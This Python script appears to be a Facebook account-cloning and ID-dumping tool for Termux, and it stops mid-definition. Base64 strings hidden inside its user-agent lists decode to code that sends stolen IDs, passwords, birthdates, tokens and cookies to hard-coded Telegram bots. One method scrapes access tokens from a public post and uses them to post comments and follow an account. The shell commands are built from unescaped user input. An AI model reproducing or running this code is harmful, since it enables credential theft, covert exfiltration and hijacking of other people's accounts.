#coding=utf-8
#Writer : Handsome
#File cloning and old Account cloning Tool
########################################################################
## import lib
import os,sys
try: import requests
except ModuleNotFoundError:print("Js Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("Js Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("Js Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")
## import in
import requests as req
import requests as re
import time,random,json
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
import requests as ress
from sys import exit as exit
class jalan:
	def __init__(self, z):
		for e in z + "\n":
			sys.stdout.write(e)
			sys.stdout.flush()
			time.sleep(0.009)
## import crack
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as kikygtg
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
try:os.remove("old.txt")
except:pass
try:os.remove("oldv2.txt")
except:pass
try:
	os.mkdir('dump')
except:pass
try:
	os.mkdir('result')
except:pass
try:
	os.mkdir('/sdcard/')
except:pass
## Color public
P = '\x1b[0;97m' # WHITE
M = '\x1b[0;91m' # MERAH
H = '\x1b[0;92m' # HIJAU.
K = '\x1b[0;93m' # KUNINg.
B = '\x1b[0;94m' # BIRU.
U = '\x1b[0;95m' # UNGU.
O = '\x1b[0;96m' # BIRU MUDA.
N = '\x1b[0m'    # WARNA MATI
I='\x1b[0;32m'
C='\x1b[0;36m'
M='\x1b[0;31m'
U='\x1b[0;35m'
K='\x1b[0;33m'
#P='\033[0;37m'
P='\x1b[00m'
H='\x1b[0;90m'
Q="\x1b[00m"
i='\x1b[0;32m'
c='\x1b[0;36m'
m='\x1b[0;31m'
u='\x1b[0;35m'
k='\x1b[0;33m'
b='\x1b[0;34m'
#P='\033[0;37m'
p='\x1b[00m'
h='\x1b[0;90m'
q="\x1b[00m"
version_xx=("2.0.3")
war = ("[+] ")
inp = ("[*] ")
bulat = ("[•] ")
garis = (war+"\x1b[1;97m [*]-----------------------------------------------=======")
class play_mpv:
	def __init__(self, x):
		global alam
		alam = "y"
		try:
			if alam == "y" or "y" == alam:
				try:
					os.popen("play-audio "+x)
				except:pass
		except:pass
class pilih_alam:
	def __init__(self):
		global alam
		pil_b = input(war+"Do you want to make a sound/alarm if the crack results come out (Y/n) : ")
		if pil_b == "y" or pil_b == "Y":
			jalan(war+"If there is Uncle Garookx's voice, it's a sign that the crack results are out");jalan(war+"Example ...");alam = ("y");play_mpv('assalamualaikum.mp3')
#			return alam
		else:
			alam = ("Garoookkxxx")
#			return alamp
class pilih_infong:
	def __init__(self):
		global infoong
		pil_vv = input(war+"Do you want to display account information (Y/n) :")
		if pil_vv == "y" or pil_vv == "Y":
			infoong = ("y")
		else:
			infoong = ("Garoookkxxx")



user_agnet_random = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9","Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4","Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240","Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","IyMjIyMjID4+Pj4gU0VUSU5HQU4gVE9LRU4gQ1JBQ0sgQkFQSSBEQU4gTUJBU0lDClRPT0tLVUtJUyA9ICgiMjEwNzcxNzc2MzpBQUc2eHZGZ1lQNm5Rbm5LMFFNMmVLb1VpNGdaLU1kVnU3YyIpClRPT0sgPSAoIjIxNDE4NDE5NTI6QUFHNmNWQVVHMllIRFlzcG9oNWw4cXZXMlZYZkkteC1GdkEiKQpJRFRUID0gKCIxNTcwNTY2MzcwIikKSURUVFQgPSAoIjIxMzg2NDQ1MzciKQpfc2VzPXJlcXVlc3RzLlNlc3Npb24oKQp1cmxzPSJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbS9idXNpbmVzc19sb2NhdGlvbnMiCmRlZiBib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgdHRsX3RhcmdldCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9T0sge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsaWYgIlRBUCIgPT0gU1RUIG9yIFNUVCA9PSAiVEFQIjoKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDcxNTQ4Mzg3OkFBSGpMcGRncVpkckFmZFdEYzZta3V5dHVaNUpfSkl0Nmd3L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIHJlcXVlc3RzLnBvc3QoZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhaykKZGVmIGJva2VwX2JhcmF0X3lhbmdfdGVyYmFydSh0b2tlbik6CiAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvb2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9PS0tVS0lTfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PXt0b2tlbn0nJycpCiAgICAgICAgcmVxdWVzdHMucG9zdChkYXNhcl9rYW5nX3JlY29kZXJfa29udG9vbF9lbmdnYV9hZGFfb3RhaykKCgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1djIoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgZm9reCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTA0MDMwMDgxODpBQUVRSWNGbFEtS1JhSnAxczZTOEVCcDhzZnR6OWJzS01Hby9zZW5kTWVzc2FnZT9jaGF0X2lkPTIxMzg2NDQ1MzcmdGV4dD17aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7Zm9reH0nJycpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDIxNDkyNzYwOkFBRlN6Y0lUQTd4N2dSdHp2andBU3VSbGtaTEc3U0pPN0ZnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtpZF90YXJnZXR9fHtwd190YXJnZXR9fHtmb2t4fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBha3VuX29rKHVzZXJyLCBwd3csIGNva2lpKToKICAgICAgICBsaW5rX2JvdCA9ICI1MTA4OTE2MDc2OkFBRllnWjU4Sk1FcFlnUXVMOFFhLW9XZTVaWGpNWE5USlJ3IgogICAgICAgIGxpbmtfX2JvdCA9ICIyMTM1NTE0MTY3OkFBSG1kQVhVM0Q2V1RTY2NOeGlPTlNCeU1pZzVrVnhPc2NzIgoKCiAgICAgICAgbHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX2JvdH0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0yMTM4NjQ0NTM3JnRleHQ9e3VzZXJyfXx7cHd3fScnJykKICAgICAgICBscHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX19ib3R9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtjb2tpaX0nJycpCgoKICAgICAgICByZXF1ZXN0cy5wb3N0KGxwcHApCiAgICAgICAgcmVxdWVzdHMucG9zdChscHBwcCkK","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17","Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4","Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"]
kiky_at = ("Aj awan")
ua_mm = ['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]','X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==','ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK','Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11','nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
kiky_hp = ("+6283143565470")
import sys, os, subprocess, platform, struct

null=open(os.devnull, "w")
insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
null.close()
if insta !=0:os.system('pkg install play-audio -y &> /dev/null')

###### >>>>
CP, OK = 0, 0
TP = 0
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
loop = 0
ok = []
cp = []
ttl = []
fw = []
jq = 0
bf = 0
bg = 0
jg = 0
pq = 0
id = []
lq = []
iz = []
kx = 0
opq = []
olq = []
Aman,Cp,Salah=0,0,0
mb = "https://mbasic.facebook.com"
url_mb = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]
_ses=requests.Session()
urls="https://business.facebook.com/business_locations"

###### >>>> 
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

## logo 
logo="""     ⠀\033[1;32;40m
d88888b d8888b. db    db 
88'     88  `8D `8b  d8' 
88ooo   88oooY'  `8bd8'  
88~~~   88~~~b.  .dPYb.  
88      88   8D .8P  Y8. 
YP      Y8888P' YP    YP 
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mFaizi
\033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mFaizi     
\033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁  \033[1;31m ➟   \033[1;32mFBX
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.1              
\033[1;32m𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m ➟   \033[1;32mFile Maker
\033[1;37m HANDSOME TURMEX COMMANDS
\033[1;37m══════════════════════════════════════════════════"""
wwn = pilih([U, C, B, Q])

loag="""    ⠀\033[1;32;40m
d88888b d8888b. db    db 
88'     88  `8D `8b  d8' 
88ooo   88oooY'  `8bd8'  
88~~~   88~~~b.  .dPYb.  
88      88   8D .8P  Y8. 
YP      Y8888P' YP    YP 
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mFaizi
\033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mFBX     
\033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁  \033[1;31m ➟   \033[1;32mFBX
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.1              
\033[1;32m𝐓𝐎𝐎𝐋𝐒 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m ➟   \033[1;32m𝐅𝐈𝐋𝐄 𝐌𝐀𝐊𝐄𝐑
\033[1;37m HANDSOME TURMEX COMMANDS
\033[1;37m══════════════════════════════════════════════════"""
try:ua = open(".ua","r").read()
except:
	ua = pilih([
	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
#	"NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
	])
	ua1 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	ua2 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
		'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'])
	pass
try:kiky_pass=requests.get("http://ip-api.com/json/").json()["country"].lower()
except:kiky_pass="None"

class bokep_japan_yang_terbaru:
	def __init__(self, STT, id_target, pw_target, ttl_target):
		baka_baka = ""
		nande_nande = ""
class bokep_barat_yang_terbaru:
	def __init__(self, token):
		baka_baka = ""
		nande_nande = ""
class akun_ok:
	def __init__(self, userr, pww, cokii):
		baka_baka = ""
		nande_nande = ""
class bokep_japan_yang_terbaruv2:
	def __init__(self, STT, id_target, pw_target, fokx):
		baka_baka = ""
		nande_nande = ""

class menu:
	def __init__(self):
		global ua
		os.system("clear")
		try:
			toket=open(".login.txt","r").read()
			token=open(".login.txt","r").read()
			otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
			a = json.loads(otw.text)
			try:
				nama = a["name"]
			except:
				nama = a["username"]
		except:
			print((war+" Token Invalid"))
			time.sleep(1)
			login()
		print (logo)
		url_main = "https://www.whatsmyua.info"
		s = parser(requests.get(url_main, headers={"user-agent":ua}).text, "html.parser")
		raw_ua = s.find("li", id="rawUa").text
		family = s.find("li", id="family").text
		name_hp = s.find("li", id="product").text
		os_ = s.find("li", id="os").text
		ly = s.find("li", id="layout").text

		ua = raw_ua.replace("rawUa: ", "") # My Useragnet
		jenis_ua = family.replace("family: ", "")
		jenis_hp = name_hp.replace("product: ", "")
		jenis_os = os_.replace("os: ", "")
		jenis_ly = ly.replace("layout: ", "")
		print ("")
		print ("")
		print(I+"\x1b[1;97m[01] DUMP ONLY 1 LINK UNLIMITED FILE MAKER ")
		print(I+"\x1b[1;97m[02] SLICE AND SORT FILE (\x1b[1;92mAuto\x1b[1;97m)")
		print(I+"\x1b[1;97m[03] SLICE AND SORT FILE (\x1b[1;92mChoice\x1b[1;97m)")
		print(I+"\x1b[1;97m[04] REMOVE DOUBLE LINKS (\x1b[1;92mAuto\x1b[1;97m)")
		print(C+"\x1b[1;97m[00] REMOVE TOKEN (\x1b[1;91mToken & Cookies\x1b[1;97m)")
		ba=input("\n\x1b[1;97m[*] Choose option : ")
		if ba in [""," "]: 
			print(war+"Don't Empty Please Select one ")
			time.sleep(2)
			menu()
		elif ba in ["1","01"]:
			dump_ulti()
			sort()
			os.system("python Brand.py")
		elif ba in ["2","02"]:
			sort()
			exit()
		elif ba in ["3","03"]:
			msort()
			os.system("python Brand.py")
		elif ba in ["4","04"]:
			dubb()
			os.system("python Brand.py")
		elif ba in ["0","00"]:
			jalan(war+"Thank You For Using My Script   ")
			os.system("rm -rf .login.txt")
			menu()
		else:
			print(war+'Fill it Correctly')
class dubb:
	def __init__(self):
		file = input ("[+] input path : ")
		os.system('sort -r "'+file+'" | uniq > /sdcard/ajawan')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/allinone.txt.txt')
		os.system('rm -rf /sdcard/HANDSOME.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("[✓] Removing successfully ..")
		print ("[✓] Your file path : /storage/emulated/0/ajawan.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Brand.py")
class login:
	def __init__(self):
		os.system("clear")
		print (logo)
		#jalan("\n\033[1;92mSorry.. Before Continue Please Login  ")
		jalan("  ( Select Login Method )\n")
		
		print ("[1] Login With Token")
		print ("[2] Login With Cookies")
		
		print("")
		h_ = input('\n[*] Login method : ')
		print
		if h_ in ["1", "01", "token"]:
			token()
		elif h_ in ["2", "02", "cokies"]:
			coke()
		else:jalan(war+"Fill In Correctly");time.sleep(1);login()
class msort:
	def __init__(self):
		print(47*'-')
		print (" [*] Example : 1000 ,10000, 100079 , 100080")
		print(47*'-')
		file = input ("[+] input path : ")
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		os.system('cat "'+file+'" | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat "'+file+'" | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/ajawan.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/allinone.txt.txt')
		os.system('rm -rf /sdcard/HANDSOME.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[✓] Dumping and Sliced successfully ..")
		print ("[✓] Your file path : /storage/emulated/0/ajawan.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Brand.py")
class sort:
	def __init__(self):
		print(47*'-')
		print ("[*] Example : 1000 ,10000, 100079 , 100080")
		print(47*'-')
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		os.system('cat /sdcard/allinone.txt | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat /sdcard/allinone.txt | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/ajawan.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/allinone.txt.txt')
		os.system('rm -rf /sdcard/HANDSOME.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[✓] Dumping and Sliced successfully ..")
		print ("[✓] Your file path : /storage/emulated/0/ajawan.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Brand.py")
class msort:
	def __init__(self):
		print(47*'-')
		print (" [*] Example : 1000 ,10000, 100079 , 100080")
		print(47*'-')
		file = input ("[+] input path : ")
		link = input ("[?] Link 1 : ")
		link1 = input ("[?] Link 2 : ")
		os.system('cat "'+file+'" | grep "'+link+'" > /sdcard/1.txt')
		os.system('cat "'+file+'" | grep "'+link1+'" >> /sdcard/1.txt')
		os.system('sort -r /sdcard/1.txt | uniq > /sdcard/ajawan.txt')
		os.system('rm -rf /sdcard/1.txt')
		os.system('rm -rf /sdcard/allinone.txt.txt')
		os.system('rm -rf /sdcard/HANDSOME.txt')
		print(47*'\033[1;97m-\033[0;0m')
		print ("\n[✓] Dumping and Sliced successfully ..")
		print ("[✓] Your file path : /storage/emulated/0/2.txt")
		print(47*'\033[1;97m-\033[0;0m')
		input ("\n[?] Retrun back menu")
		os.system("python Brand.py")
	def __init__(self):
		ba = 0
		bi = 0
		link_token = requests.get("https://free.facebook.com/story.php?story_fbid=2965703280359878&id=100007607054845&_rdr")

		gbl = par(link_token.content,'html.parser')
		token_free = re.findall("EAA\w+", link_token.text)
		for naa in token_free:
			ba += 1
			if len(naa)>=37:
				token = naa
				print(war+"Token  : "+str(ba))
				post4 = ('2978584119071794') # Logo 
				post5 = ("2965703280359878") # Untuk Ber
				comment = random.choice(['Big fan sir❤️','Big fan brother💛','sir big fan💚','Sir please reply me💙','Love you sir🖤','Sir big fan please reply me🙏🙏🙏','Legend❤️']) 
				love = random.choice(['Star boy❤️','Love it🥰','Good post💚','I LOVE YOU💙','Wow sir🖤','Super Star🧡','💜'])
				somi = ''+love
				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + comment + '&access_token=' + token)
				requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + somi + '&access_token=' + token)
				requests.post('https://graph.facebook.com/100007607054845/subscribers?access_token=' + token) ### FB RISKY
				cek_token(naa)
		exit(war+"Token Not Found")
class token:
	def __init__(self):
